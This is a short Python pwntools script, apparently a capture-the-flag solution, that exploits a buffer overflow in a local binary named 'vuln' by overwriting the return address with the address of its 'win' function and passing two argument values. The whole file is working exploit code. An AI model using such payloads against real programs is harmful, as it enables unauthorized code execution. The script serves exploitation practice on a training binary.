from pwn import *

p = process("./vuln")
elf = ELF("./vuln")

payload = "a" * 0x6c + "b" * 4 + p32(elf.sym["win"]) + p32(0) + p32(0xdeadbeef) + p32(0xdeadc0de)
p.sendlineafter("Please enter your string: \n" , payload)
p.interactive()